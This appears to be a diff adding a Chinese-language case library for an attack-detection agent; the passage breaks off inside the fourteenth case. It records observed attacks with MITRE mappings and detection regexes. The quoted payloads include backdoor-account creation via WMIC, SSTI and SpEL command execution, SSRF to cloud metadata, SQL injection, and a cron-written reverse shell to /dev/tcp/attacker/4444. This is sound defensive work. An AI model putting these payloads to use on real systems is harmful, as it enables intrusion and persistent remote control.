@@ -1,0 +1,1692 @@
+{
+  "description": "攻击检测Agent案例记忆库 —— 相似案例检索辅助攻击链分析（cases: 案例实例；activity_patterns: 跨案例活动模式【实验性子层】）",
+  "cases": [
+    {
+      "id": "CASE-001",
+      "source": "HIDS",
+      "attack_type": "横向移动 / 远程命令执行 (WMIC)（载荷演进：侦察 → 持久化）",
+      "kill_chain": [
+        "初始访问(已立足主机)",
+        "执行/横向移动(WMIC远程)",
+        "发现(whoami) → 持久化(创建后门账户)"
+      ],
+      "mitre": [
+        "T1047",
+        "T1033",
+        "T1136.001",
+        "T1098"
+      ],
+      "indicators": {
+        "observed_targets": [
+          "10.20.6.179",
+          "10.20.6.162",
+          "10.20.4.70",
+          "10.20.6.49",
+          "10.20.7.88",
+          "10.20.7.99"
+        ],
+        "observed_payloads": [
+          "cmd.exe /c whoami（侦察探针）",
+          "cmd.exe /c net user /add backdoor 05449a53Aa1! && net localgroup ad...（创建后门账户并加入本地组，日志截断）",
+          "cmd.exe /c whoami（10.20.7.88，侦察阶段前缀观测）",
+          "cmd.exe /c whoami && net user /add service 0xPassw0rd! && net localgroup admini…（10.20.7.99，创建后门账户 service 并加组；日志截断）"
+        ],
+        "signature_cmd": "wmic /node:<ip> process call create",
+        "escalation_note": "载荷从侦察（whoami）升级为持久化（后门账户 net user /add backdoor + net localgroup），表明攻击者从侦察转入立足控制"
+      },
+      "signature": "WMIC 远程进程创建：以 `wmic /node:<目标IP> process call create` 在远端主机执行命令；已六次观测，目标轮换（10.20.6.179 → 10.20.6.162 → 10.20.4.70 → 10.20.6.49 → 10.20.7.88（侦察）→ 10.20.7.99（持久化）），载荷演进：whoami 侦察 → 创建后门账户并加组（持久化）",
+      "reasoning": "WMIC 远程 process call create 是典型横向移动/远程执行手法（T1047）。早期载荷 whoami 为账户发现（T1033）；05-03 观测到载荷升级为 `net user /add backdoor 05449a53Aa1! && net localgroup ad…`——创建本地后门账户并加入组（推断为 administrators，T1136.001 创建账户 + T1098 账户操纵），属持久化行为。已六次观测（05-02、05-03、05-21 两次、06-02 两次），目标轮换但载体一致，同一工具链且能力在升级。 新增观测：2026-06-02 09:11 wmic /node:10.20.7.88 仅带 whoami 侦察（前缀阶段）；同日 09:35 wmic /node:10.20.7.99 复现完整链——whoami → net user /add service 0xPassw0rd! → net localgroup admini…（截断）。后门账户名轮换（backdoor → service），目标转入 10.20.7.x 网段，工具链与载荷形态不变，判定同一攻击者/工具链持续（侦察→持久化演进再次复现）。",
+      "retrieval_keys": [
+        "wmic",
+        "process call create",
+        "远程执行",
+        "横向移动",
+        "whoami",
+        "net user",
+        "net localgroup",
+        "backdoor",
+        "后门账户",
+        "T1047",
+        "T1136"
+      ],
+      "pattern_probes": [
+        "wmic\\s+/node:",
+        "net\\s+user\\s+/add",
+        "net\\s+localgroup\\s+ad"
+      ],
+      "action_sequence": [
+        "wmic_remote_exec",
+        "whoami_probe",
+        "net_user_add",
+        "net_localgroup_add"
+      ]
+    },
+    {
+      "id": "CASE-002",
+      "source": "DNS",
+      "attack_type": "DGA 域名生成 / C2 信标 (DNS)",
+      "kill_chain": [
+        "植入",
+        "命令与控制(DGA域名解析回连)"
+      ],
+      "mitre": [
+        "T1568.002",
+        "T1071.004"
+      ],
+      "indicators": {
+        "observed_domains": [
+          "marwul-3b1b.net",
+          "aodldd-7342.net",
+          "bpweeg-a867.net",
+          "clmiyk-4791.net",
+          "oedgsv-2e73.net",
+          "maoamz-a258.net",
+          "ozcmfk-dee3.net",
+          "sufees-c760.net",
+          "krcszg-16ff.net",
+          "kpedpm-3d20.net",
+          "lvscco-60c8.net",
+          "xkqwvp-9d2f.net"
+        ],
+        "subdomain_pattern": "8位随机十六进制前缀",
+        "resolved_ips": [
+          "10.10.35.154",
+          "198.51.100.22",
+          "10.10.44.12",
+          "10.10.39.10",
+          "203.0.113.15",
+          "10.10.33.22",
+          "10.10.38.192",
+          "192.0.2.28",
+          "10.10.26.31",
+          "10.10.29.128",
+          "10.10.41.218",
+          "10.10.42.223",
+          "192.0.2.156",
+          "10.10.29.50",
+          "10.10.23.157",
+          "203.0.113.220",
+          "10.10.31.102",
+          "198.51.100.242",
+          "10.10.37.111",
+          "10.10.49.185",
+          "10.10.29.210",
+          "203.0.113.136",
+          "10.10.34.52",
+          "10.10.37.173",
+          "10.10.43.124",
+          "192.0.2.85",
+          "203.0.113.35",
+          "10.10.27.205",
+          "10.10.30.8",
+          "10.10.32.171",
+          "203.0.113.102",
+          "10.10.36.7",
+          "203.0.113.77"
+        ],
+        "query_behavior": "每域名约2-5分钟内3次连续A记录查询，子域各不相同，解析IP轮换",
+        "cross_wave_ip_reuse": "192.0.2.28 在 bpweeg-a867.net 与 clmiyk-4791.net 两波解析中复用（跨波基础设施关联证据）"
+      },
+      "signature": "多个二级域（marwul-3b1b.net、aodldd-7342.net、bpweeg-a867.net、clmiyk-4791.net、oedgsv-2e73.net、maoamz-a258.net、ozcmfk-dee3.net、sufees-c760.net、krcszg-16ff.net、kpedpm-3d20.net、lvscco-60c8.net 等）下，短时间内连续查询 8 位随机十六进制前缀子域名的 A 记录，解析 IP 轮换——DGA/C2 回连信标特征，跨域反复出现（已十二次）",
+      "reasoning": "随机子域 + 固定主域 + 高频连续查询 + 解析IP轮换，符合 DGA（T1568.002）与 DNS C2 信标（T1071.004）。已十一次观测到不同主域呈现同一模式（marwul-3b1b.net、aodldd-7342.net、bpweeg-a867.net、clmiyk-4791.net、oedgsv-2e73.net、maoamz-a258.net、ozcmfk-dee3.net、sufees-c760.net、krcszg-16ff.net、kpedpm-3d20.net、lvscco-60c8.net），且解析 IP 跨波复用（192.0.2.28），疑似同一木马家族的 DGA 种子/域池轮换。正常业务不会在短窗口内连续请求随机子域且指向轮换IP。 新增观测：05-28 主域轮换为 lvscco-60c8.net（子域 2ab0df32、dccc1ee0、af02e69e；解析 IP 10.10.32.171、203.0.113.102、10.10.36.7），行为与既往一致（短窗口连续 A 记录、解析 IP 轮换）。 新增观测：2026-06-02 09:12 主域 xkqwvp-9d2f.net（子域 3fa2b9c1、解析 IP 203.0.113.77），8 位 hex 子域与 A 记录查询形态与既往一致。",
+      "retrieval_keys": [
+        "DGA",
+        "随机子域",
+        "DNS信标",
+        "C2",
+        "fast-flux",
+        "T1568",
+        "T1071",
+        "marwul",
+        "aodldd",
+        "bpweeg",
+        "clmiyk",
+        "oedgsv",
+        "maoamz",
+        "ozcmfk",
+        "sufees",
+        "krcszg",
+        "kpedpm",
+        "lvscco",
+        "xkqwvp"
+      ],
+      "pattern_probes": [
+        "\\b[0-9a-f]{8}\\.[a-z0-9-]+\\.(net|com|org)\\b"
+      ],
+      "action_sequence": [
+        "dga_hex_subdomain"
+      ]
+    },
+    {
+      "id": "CASE-003",
+      "source": "WAF+RASP",
+      "attack_type": "Web 漏洞利用链：路径穿越(LFI) → Node.js 沙箱逃逸(RCE) → SSRF 窃取云元数据",
+      "kill_chain": [
+        "侦察(LFI读/etc/passwd)",
+        "初始访问/执行(Node.js沙箱逃逸RCE)",
+        "凭据窃取(SSRF→云IMDS)"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059.007",
+        "T1552.005"
+      ],
+      "indicators": {
+        "observed_targets": [
+          "app-node-48.ops-corp.com",
+          "app-nginx-61.ops-corp.com",
+          "app-nginx-59.ops-corp.com",
+          "app-nginx-102.ops-corp.com",
+          "app-node-67.ops-corp.com",
+          "app-node-186.ops-corp.com",
+          "app-node-173.ops-corp.com",
+          "app-node-17.ops-corp.com"
+        ],
+        "path": "/public/plugins/alertlist/../../../etc/passwd",
+        "js_payload": "this.constructor.constructor('return process')().mainModule.require",
+        "ssrf_target": "169.254.169.254",
+        "detection": "WAF 与 RASP 双层同时命中",
+        "path_variants": [
+          "/public/../../../etc/passwd（app-node-67，05-01；同请求携 cache_key=../../../tmp/fc04ac）",
+          "/static/../../../etc/passwd?path=/etc/passwd（app-node-186，05-01；同请求携 mount -t overlay 尝试）",
+          "/public/plugins/alertlist/../../../../etc/passwd（app-nginx-102，05-29；层级加深变体）"
+        ],
+        "ssrf_variants": [
+          "/api/fetch?url=http://169.254.169.254/latest/meta-data/（app-node-173 05-28、app-node-17 05-29——参数型 SSRF 直打 IMDS）"
+        ]
+      },
+      "signature": "Node.js Web 应用遭路径穿越(LFI)读 /etc/passwd，载荷用 `this.constructor.constructor('return process')().mainModule.require` 绕过沙箱实现 RCE，并 SSRF 到 169.254.169.254 窃取云实例元数据凭据；LFI 路径已跨目标复现（app-node-48 → app-nginx-61 → app-nginx-59 → app-nginx-102，含 /public、/static 前缀变体）；SSRF 直打 IMDS 再现为独立参数型向量（/api/fetch?url=…，app-node-173 / app-node-17）",
+      "reasoning": "URL 中 `../../../etc/passwd` 为路径穿越/文件包含（配合 T1190 利用公开应用）；`this.constructor.constructor('return process')()` 是经典 JS Function 构造器沙箱逃逸，取得 process 后可 mainModule.require 任意模块执行命令（T1059.007）；`url=@url:`http://169.254.169.254` 为 SSRF 打云元数据服务窃取实例凭据（T1552.005）。同一攻击 2 秒内被 WAF（网络层）与 RASP（运行时）同时捕获，属高置信恶意利用链。05-24 再次观测到同一路径的 LFI 试探（目标轮换 app-nginx-61.ops-corp.com，UA 轮换为 Android 移动端），判为同一战役路径复用；该次日志截断，仅见 LFI 阶段，未含 JS/SSRF 载荷证据。 新增观测：LFI 模版再现——05-28 app-nginx-59（原路径）、05-29 app-nginx-102（四级 ../ 变体）、05-01 app-node-67（/public 前缀＋cache_key 穿越）、app-node-186（/static 前缀＋mount overlay 提权尝试）；另见参数型 SSRF 独立向量（/api/fetch?url=http://169.254.169.254/latest/meta-data/，app-node-173、app-node-17），与其 SSRF 阶段同类（直读 IMDS 元数据）。路径模版持续跨目标复用，判定为同一工具习惯。",
+      "retrieval_keys": [
+        "路径穿越",
+        "LFI",
+        "Node.js",
+        "沙箱逃逸",
+        "constructor",
+        "RCE",
+        "SSRF",
+        "169.254.169.254",
+        "云元数据",
+        "IMDS",
+        "T1552"
+      ],
+      "pattern_probes": [
+        "(?:\\.\\./){2,}",
+        "169\\.254\\.169\\."
+      ],
+      "action_sequence": [
+        "lfi_traversal",
+        "node_sandbox_escape",
+        "imds_target",
+        "mount_overlay_priv"
+      ]
+    },
+    {
+      "id": "CASE-004",
+      "source": "HIDS",
+      "attack_type": "SSH 横向移动（落地密钥 + 免主机校验）",
+      "kill_chain": [
+        "初始访问(立足)",
+        "横向移动(SSH)",
+        "发现(id;hostname)"
+      ],
+      "mitre": [
+        "T1021.004",
+        "T1033"
+      ],
+      "indicators": {
+        "key_file": "/tmp/.key",
+        "observed_targets": [
+          "root@10.20.8.58",
+          "root@10.20.8.183",
+          "root@10.20.4.121",
+          "root@10.20.6.196",
+          "root@10.20.4.131",
+          "root@10.20.3.138"
+        ],
+        "flags": "StrictHostKeyChecking=no",
+        "payload": "id; hostname"
+      },
+      "signature": "以落地密钥 /tmp/.key 免主机校验（StrictHostKeyChecking=no）SSH 登录目标主机执行 `id; hostname`——窃取密钥横向移动并侦察；已六次观测，目标轮换（10.20.8.58 → 10.20.8.183 → 10.20.3.138 → 10.20.4.121 → 10.20.6.196 → 10.20.4.131），手法与标志完全一致",
+      "reasoning": "`-i /tmp/.key` 表明使用落地/窃取的私钥；`-o StrictHostKeyChecking=no` 关闭主机指纹校验，是自动化攻击/木马横向移动的典型标志；`id; hostname` 为账户与主机发现（T1033/T1082）。SSH 远程登录属横向移动（T1021.004）。已六次观测（05-01、05-08 三次、05-15、05-24；新增 05-08 09:24 → 10.20.3.138），目标轮换但手法与标志完全一致，疑似同一工具链/攻击者习惯。",
+      "retrieval_keys": [
+        "ssh",
+        "StrictHostKeyChecking=no",
+        "横向移动",
+        "落地密钥",
+        "/tmp/.key",
+        "T1021"
+      ],
+      "pattern_probes": [
+        "stricthostkeychecking=no"
+      ],
+      "action_sequence": [
+        "ssh_landed_key",
+        "ssh_no_hostcheck",
+        "id_hostname_probe"
+      ]
+    },
+    {
+      "id": "CASE-005",
+      "source": "WAF+RASP",
+      "attack_type": "Web CGI 命令注入（双编码路径穿越绕过 + echo;id 探针）",
+      "kill_chain": [
+        "侦察/绕过(双编码规避检测)",
+        "命令注入执行(/bin/sh)"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059.004"
+      ],
+      "indicators": {
+        "path": "/cgi-bin/%%32%65%%32%65/bin/sh",
+        "payload": "echo;id",
+        "encoding": "双重 URL 编码（%%32%65 解码两次得到 `.`）",
+        "detection": "WAF 与 RASP 双层同时命中",
+        "observed_targets": [
+          "app-php-98.ops-corp.com",
+          "app-php-201.ops-corp.com"
+        ],
+        "encoding_variants": [
+          ".%2e（单层编码，05-02 观测）"
+        ]
+      },
+      "signature": "针对 CGI 路径的 Web 命令注入：以双重 URL 编码（%%32%65→%2e→.）绕过检测构造 `../../` 穿越至 /bin/sh，注入 `echo;id` 探针命令——WAF/RASP 双层告警；已两次观测：第二次（05-02，app-php-201）为单层 `.%2e` 变体（/cgi-bin/.%2e/.%2e/bin/sh?cmd=echo;id），伴 `id=1; EXEC xp_cmdshell('id')--` 数据库命令探针混投",
+      "reasoning": "%%32%65 经两次解码还原为 `.`，双编码属典型 WAF 绕过手法；`/cgi-bin/../..//bin/sh` + `echo;id` 为 CGI 命令注入（T1190 利用公开应用 + T1059.004 Unix Shell 执行）。echo;id 是验证性探针（确认可执行后一般会扩大利用），常见于自动化扫描/利用工具。RASP 层捕获解码后的 {cmd: \"echo;id\"}，证实注入到达运行时。 第二次观测（05-02，HID0007462）：编码演化单层 `.%2e`，目标轮换 app-php-201；同请求携带 MSSQL 命令探针 `id=1; EXEC xp_cmdshell('id')--`。载体不变（CGI 路径导出 /bin/sh + echo;id 探针），判定同手法（编码变体已补入探测器）。",
+      "retrieval_keys": [
+        "cgi-bin",
+        "命令注入",
+        "双编码",
+        "%%32%65",
+        "echo;id",
+        "WAF绕过",
+        "T1059"
+      ],
+      "pattern_probes": [
+        "%%32%65|%252e|\\.%2e",
+        "cgi-bin/.*bin/sh",
+        "echo;id"
+      ],
+      "action_sequence": [
+        "double_encoded_dot",
+        "cgi_sh_path",
+        "echo_id_probe",
+        "xp_cmdshell_probe"
+      ]
+    },
+    {
+      "id": "CASE-006",
+      "source": "WAF+RASP",
+      "attack_type": "Java 反序列化 RCE + 参数命令注入",
+      "kill_chain": [
+        "侦察/初始访问(利用公开应用)",
+        "执行(反序列化载荷 + 命令注入)"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059.004"
+      ],
+      "indicators": {
+        "observed_targets": [
+          "app-java-06.ops-corp.com",
+          "app-tomcat-51.ops-corp.com"
+        ],
+        "observed_paths": [
+          "/webtools/control/main",
+          "/api/json"
+        ],
+        "payload": "deserialization=rO0ABXNyABFqYXZhLnV0aWw=（Java 序列化流 base64）",
+        "gadget_hint": "cmd 字段携带 com.sun 开头类名（疑 JdbcRowSetImpl 等常见 gadget）",
+        "injection": "cmd=id；ip=127.0.0.1+%26+id（%26→& 命令串联）",
+        "detection": "WAF+RASP 双层（首见）；第二次观测为 RASP 单层"
+      },
+      "signature": "Java Web 应用遭反序列化 RCE 尝试：rO0AB 开头的 base64（Java 序列化流，AC ED 00 05）随请求提交，cmd/命令参数携带 com.sun 系 gadget 类名——已两次观测，目标与接口轮换（app-java-06/webtools/control/main → app-tomcat-51/api/json）",
+      "reasoning": "rO0AB 开头的 base64 解码为 Java 序列化流魔数（AC ED 00 05，载荷内可见 java.util 类名），用于触发不安全反序列化实现 RCE（T1190 利用公开应用）；首见同时伴随 cmd=id、ip=127.0.0.1%26id 参数命令注入（T1059.004）。第二次（05-02）cmd 字段携带 com.sun 开头类名（JdbcRowSetImpl 等 JNDI 注入 gadget 惯用类），本次仅 RASP 层单层捕获。两次手势一致，疑同一工具链多目标试探。另：05-21 SSTI 波次（CASE-008）亦附带同类 rO0AB 载荷（java.* 类前缀），该序列化向量在多个波次反复出现。",
+      "retrieval_keys": [
+        "反序列化",
+        "Java",
+        "rO0AB",
+        "命令注入",
+        "cmd=id",
+        "webtools",
+        "T1190",
+        "ysoserial",
+        "tomcat"
+      ],
+      "pattern_probes": [
+        "rO0AB",
+        "%ac%ed",
+        "cmd=(?:id|whoami|uname)\\b|%26\\s*(?:id|whoami|uname)\\b",
+        "com\\.sun\\."
+      ],
+      "action_sequence": [
+        "java_ser_magic",
+        "cmd_id_probe",
+        "com_sun_gadget",
+        "gcp_metadata_ssrf"
+      ]
+    },
+    {
+      "id": "CASE-007",
+      "source": "HIDS",
+      "attack_type": "Windows 网络枚举 + SMB 管理员共享横向移动",
+      "kill_chain": [
+        "发现(域/主机枚举 net view)",
+        "横向移动(SMB 管理共享 C$)"
+      ],
+      "mitre": [
+        "T1018",
+        "T1021.002",
+        "T1135"
+      ],
+      "indicators": {
+        "target_share": "\\\\10.20.10.44\\C$",
+        "cmd": "net view /domain && net use \\\\10.20.10.44\\C$",
+        "note": "C$ 管理员共享需高权限凭据；&& 串联表明脚本化执行"
+      },
+      "signature": "Windows 主机以 `net view /domain` 枚举域内主机，随后 `net use` 挂载远端管理员共享 `\\\\10.20.10.44\\C$`——域侦察 + SMB 管理员共享横向移动",
+      "reasoning": "`net view /domain` 为远程系统发现（T1018）；挂载管理共享 `\\\\<host>\\C$` 是经典 SMB 横向移动手法（T1021.002/T1135），C$ 需管理员权限——表明攻击者已持有高权限凭据（可能来自前序凭据窃取）。挂载后常见后续动作是投递文件/服务执行（如 PsExec、计划任务）以控制目标主机。`&&` 串联为自动化脚本特征。",
+      "retrieval_keys": [
+        "net view",
+        "net use",
+        "C$",
+        "SMB",
+        "管理员共享",
+        "横向移动",
+        "T1021.002",
+        "10.20.10.44"
+      ],
+      "pattern_probes": [
+        "net\\s+view\\s+/domain",
+        "net\\s+use\\s",
+        "C\\$"
+      ],
+      "action_sequence": [
+        "net_view_domain",
+        "smb_admin_share"
+      ]
+    },
+    {
+      "id": "CASE-008",
+      "source": "WAF",
+      "attack_type": "Web 模板注入 SSTI（Jinja2 对象链逃逸执行命令）",
+      "kill_chain": [
+        "侦察/初始访问(利用模板渲染接口)",
+        "执行(SSTI→os.popen 命令执行)"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059.006"
+      ],
+      "indicators": {
+        "path": "/api/v1/render",
+        "ssti_payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}",
+        "deserialization_fragment": "data=rO0ABXNyABRqYX...（同请求附带 Java 序列化流，类名前缀 java.*）",
+        "detection": "WAF 单层（本波日志中）"
+      },
+      "signature": "模板渲染接口遭 SSTI：`{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}` 经 Jinja2 对象链逃逸取得 os 模块执行命令；同一请求另附带 rO0AB Java 反序列化载荷——多向量组合试探",
+      "reasoning": "`__class__.__init__.__globals__` 为 Jinja2 沙箱逃逸经典对象链（经 config 对象回溯全局命名空间取 os 模块），popen(\"id\") 执行探针命令——判定 SSTI→RCE（T1190 + T1059.006 Python 执行）。同请求 data=rO0AB... 为 Java 序列化流（AC ED 00 05，类名 java.* 前缀，与 CASE-006 同类手法）——同一请求叠加 Python 模板注入与 Java 反序列化两个向量，提示自动化工具在后端语言未知时多向量广撒网试探。",
+      "retrieval_keys": [
+        "SSTI",
+        "模板注入",
+        "Jinja2",
+        "__class__",
+        "__globals__",
+        "popen",
+        "render",
+        "T1059.006"
+      ],
+      "pattern_probes": [
+        "\\{\\{.*__(?:class|globals|init)__",
+        "popen\\(",
+        "template=.*\\{\\{"
+      ],
+      "action_sequence": [
+        "ssti_object_chain",
+        "popen_exec",
+        "java_ser_magic"
+      ]
+    },
+    {
+      "id": "CASE-009",
+      "source": "WAF+RASP",
+      "attack_type": "Web 认证攻击：SQL 注入认证绕过 + 批量赋值（mass assignment）提权",
+      "kill_chain": [
+        "侦察/初始访问(登录接口 SQLi 绕过)",
+        "权限提升尝试(批量赋值 admin=true)"
+      ],
+      "mitre": [
+        "T1190",
+        "T1068"
+      ],
+      "indicators": {
+        "target": "app-rails-38.ops-corp.com",
+        "path": "/users/sign_in",
+        "sqli_payload": "email=' OR '1'='1'--&password=x",
+        "mass_assignment": "{\"admin\":true}（尝试直接写入管理员权限字段）",
+        "detection": "WAF 与 RASP 双层同时命中"
+      },
+      "signature": "针对登录接口的 SQL 注入认证绕过（' OR '1'='1'--）叠加批量赋值提权（{\"admin\":true}）——WAF/RASP 双层告警",
+      "reasoning": "`' OR '1'='1'--` 为经典 SQLi 认证绕过载荷（闭合引号 + 恒真条件 + 注释符截断原语句）；同一请求以 mass_assignment `{\"admin\":true}` 试图把 admin 权限字段直接绑进用户对象（CWE-915，Rails 类框架常见），属应用层权限提升尝试。WAF 与 RASP 2 秒内双层捕获，RASP 包体证实两种载荷同请求组合投递（工具化利用）。",
+      "retrieval_keys": [
+        "SQL注入",
+        "认证绕过",
+        "' OR '1'='1'",
+        "批量赋值",
+        "mass_assignment",
+        "admin",
+        "sign_in",
+        "T1190"
+      ],
+      "pattern_probes": [
+        "'\\s*or\\s+'?1'?\\s*=",
+        "\\{\\s*\"?admin\"?\\s*:\\s*true",
+        "mass_assignment"
+      ],
+      "action_sequence": [
+        "sqli_tautology",
+        "mass_assignment_admin",
+        "mysql_load_file"
+      ]
+    },
+    {
+      "id": "CASE-010",
+      "source": "WAF+WEB+RASP+HIDS",
+      "attack_type": "Web 应用命令执行：WebLogic ShellSession（MVEL 句柄）",
+      "kill_chain": [
+        "初始访问/执行(WebLogic ShellSession/MVEL 远程命令)",
+        "主机侧读取(/etc/passwd)"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059.004"
+      ],
+      "indicators": {
+        "observed_targets": [
+          "app-go-83.ops-corp.com"
+        ],
+        "payload": "cmd=127.0.0.1;id（命令探针）",
+        "handle": "com.tangosol.coherence.mvel2.sh.ShellSession（WebLogic Coherence MVEL 执行句柄）",
+        "hids_note": "宿主进程 /opt/app/main 经 /bin/sh -c 读取 /etc/passwd",
+        "detection": "WAF/WEB/RASP 三源同请求（1 秒内）"
+      },
+      "signature": "Web 应用（app-go-83）遭 WebLogic 风格 ShellSession 利用：`handle=com.tangosol.coherence.mvel2.sh.ShellSession` 句柄注入 + `cmd=127.0.0.1;id` 命令探针；1 秒内三源同请求捕获，主机侧随后见 /etc/passwd 读取",
+      "reasoning": "`handle=com.tangosol.coherence.mvel2.sh.ShellSession` 是 WebLogic Coherence 组件 MVEL 表达式执行句柄的典型特征（公开利用将命令塞进 ShellSession 句柄执行）；`cmd=127.0.0.1;id` 为注入探针（分号续接命令）。WAF/WEB/RASP 于 05-01 20:04:36-38 同请求捕获；主机侧 60 秒后见 /etc/passwd 读取（/bin/sh -c，载体 /opt/app/main），执行链落地。检索命中 CASE-006（强档，共享 cmd=id 命令探针模式）——载体不同（ShellSession 句柄 vs 反序列化载荷），按技术差异新建。",
+      "retrieval_keys": [
+        "ShellSession",
+        "com.tangosol.coherence.mvel2",
+        "WebLogic",
+        "MVEL",
+        "cmd=127.0.0.1;id",
+        "app-go-83"
+      ],
+      "pattern_probes": [
+        "com\\.tangosol\\.coherence",
+        "ShellSession",
+        "cmd=127\\.0\\.0\\.1;"
+      ],
+      "action_sequence": [
+        "cmd_loopback_probe",
+        "weblogic_shellsession"
+      ]
+    },
+    {
+      "id": "CASE-011",
+      "source": "WAF+WEB+RASP+HIDS",
+      "attack_type": "Web 应用命令执行：F5 BIG-IP iControl tmshCmd（管理面命令注入）",
+      "kill_chain": [
+        "初始访问/执行(F5 tmshCmd 管理面命令注入)",
+        "发现(tmsh 列举认证用户)"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059.004"
+      ],
+      "indicators": {
+        "observed_targets": [
+          "app-go-128.ops-corp.com"
+        ],
+        "path": "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+ad（tmsh 命令注入）",
+        "payload": "cmd=127.0.0.1;id（伴随命令探针）",
+        "detection": "WAF/WEB/RASP 三源同请求（1 秒内）"
+      },
+      "signature": "F5 BIG-IP 管理面 iControl 利用：`/tmui/login.jsp/..;/…/tmshCmd.jsp?command=…` 分号路径穿越到 tmshCmd 接口，注入 `list auth user` 探测账户；同请求伴随 `cmd=127.0.0.1;id` 探针（app-go-128）",
+      "reasoning": "`..;/` 分号路径穿越与 tmui/tmshCmd 路径为 F5 BIG-IP iControl REST 缺陷特征（CVE-2021-22986 类），tmsh 接口可执行管理命令，`list auth user` 属账户枚举意图（T1087）。WAF/WEB/RASP 于 05-02 06:59:52-54 同请求捕获；主机侧随后见 /etc/passwd 读取（载体 /usr/local/bin/app-server）。检索命中 CASE-005（中档，共享分号命令探针 `;id`）——利用载体不同（tmsh 管理接口 vs CGI 路径），按技术差异新建。",
+      "retrieval_keys": [
+        "tmshCmd",
+        "tmui",
+        "F5",
+        "BIG-IP",
+        "iControl",
+        "list auth user",
+        "app-go-128"
+      ],
+      "pattern_probes": [
+        "tmshCmd\\.jsp",
+        "command=list\\+auth",
+        "\\.\\.;/tmui"
+      ],
+      "action_sequence": [
+        "cmd_loopback_probe",
+        "tmui_semicolon_bypass",
+        "tmshcmd_jsp",
+        "tmsh_list_auth"
+      ]
+    },
+    {
+      "id": "CASE-012",
+      "source": "WAF+WEB+RASP+HIDS",
+      "attack_type": "Web 文件上传反序列化：PHP phar 伪装上传（__HALT_COMPILER 头）",
+      "kill_chain": [
+        "初始访问/执行(上传机制 → phar 反序列化)",
+        "主机侧读取(/etc/passwd)"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "indicators": {
+        "observed_targets": [
+          "app-rails-11.ops-corp.com"
+        ],
+        "upload": "filename=548979.phar&content=__HALT_COMPILER();…（PHP phar 魔数头）",
+        "rasp": "{\"deserialization\": \"AAIJABIAAAA=\", …}（序列化载荷字段到达运行时）",
+        "sql_probe": "category=' OR '1'='1（同请求附带 SQLi 式探测）",
+        "detection": "WAF/WEB/RASP 三源同请求（1 秒内）"
+      },
+      "signature": "上传参数遭 phar 伪装投递：`filename=548979.phar&content=__HALT_COMPILER();`——phar 魔数头内嵌序列化体（RASP 见 deserialization 字段）；同请求 `category=' OR '1'='1` 为附带探测",
+      "reasoning": "`__HALT_COMPILER()` 为 PHP phar 魔数头——上传后经 phar:// 封装可触发反序列化（RCE 路径）；RASP 捕获 `deserialization` 字段证实序列化载荷到达运行时。`category=' OR '1'='1` 属同请求附带探测（与 CASE-009 同款载荷再现，语境不同）。WAF/WEB/RASP 于 05-03 03:15:17-19 同请求捕获；主机侧随后见 /etc/passwd（载体 bundle exec rails server）。检索命中 CASE-009（中档，SQLi 探针共享）——本波核心为上传/反序列化，新建。",
+      "retrieval_keys": [
+        "phar",
+        "__HALT_COMPILER",
+        "deserialization",
+        "文件上传",
+        "反序列化",
+        "AAIJABIAAAA",
+        "app-rails-11"
+      ],
+      "pattern_probes": [
+        "__HALT_COMPILER",
+        "filename=\\d+\\.phar"
+      ],
+      "action_sequence": [
+        "phar_filename",
+        "phar_magic",
+        "sqli_tautology",
+        "php_ser_payload"
+      ]
+    },
+    {
+      "id": "CASE-013",
+      "source": "WAF+WEB+RASP+HIDS",
+      "attack_type": "Web 表达式注入：Spring Cloud Function SpEL（routing-expression）",
+      "kill_chain": [
+        "初始访问/执行(SpEL 表达式 → 命令)",
+        "主机侧读取(/etc/passwd)"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059"
+      ],
+      "indicators": {
+        "observed_targets": [
+          "app-spring-38.ops-corp.com"
+        ],
+        "path": "/api/v1/query",
+        "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+        "rasp": "{\"spring.cloud.function.routing-expression\": \"T(java.lang.Runt…\"}（SpEL 表达式）",
+        "detection": "WAF/WEB/RASP 三源同请求（1 秒内）"
+      },
+      "signature": "Spring 应用函数路由接口遭 SpEL 注入：`spring.cloud.function.routing-expression=T(java.lang.Runtime…` 执行命令；同行载荷 `${script:javascript:java.lang.Runtime.getRuntime().exec('id')}`（app-spring-38，宿主 java -jar spring-boot）",
+      "reasoning": "`spring.cloud.function.routing-expression` 为 Spring Cloud Function SpEL 注入缺陷特征（CVE-2022-22963 类），`T(java.lang.Runtime…)` 为 SpEL 类型引用调用链；`${script:javascript: …exec('id')}` 为同名命令探针的变体写法。WAF/WEB/RASP 于 05-03 05:18:46-48 同请求捕获；主机侧随后见 /etc/passwd（载体 java -jar spring-boot…）。检索命中 CASE-006（弱档，'java' 通用键重叠）——缺陷类别不同，新建。 探测器修订（扩图评测发现）：裸 `getRuntime().exec` 探针过泛（对 JSP webshell 等无关行强分误命中），改为本波特征形式 `${script:javascript`；`getRuntime` 仅保留为弱档检索键。",
+      "retrieval_keys": [
+        "spring.cloud.function",
+        "routing-expression",
+        "SpEL",
+        "表达式注入",
+        "getRuntime",
+        "spring-boot",
+        "app-spring-38"
+      ],
+      "pattern_probes": [
+        "spring\\.cloud\\.function\\.routing-expression",
+        "T\\(java\\.lang\\.Runtime",
+        "\\$\\{script:javascript"
+      ],
+      "action_sequence": [
+        "script_javascript",
+        "spring_routing_expr",
+        "spel_type_ref"
+      ]
+    },
+    {
+      "id": "CASE-014",
+      "source": "WAF+WEB+RASP+HIDS",
+      "attack_type": "Web 参数写持久化：注入 /var/spool/cron/root（分钟级反连）",
+      "kill_chain": [
+        "初始访问/执行(Web 参数注入写文件)",
+        "持久化(cron 分钟级任务)",
+        "命令与控制(反连 /dev/tcp)"
+      ],
+      "mitre": [
+        "T1053.003",
+        "T1059.004"
+      ],
+      "indicators": {
+        "observed_targets": [
+          "app-php-186.ops-corp.com"
+        ],
+        "path": "/api/token",
+        "payload": "key=/var/spool/cron/root&value=*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1（写 root crontab 反连）",
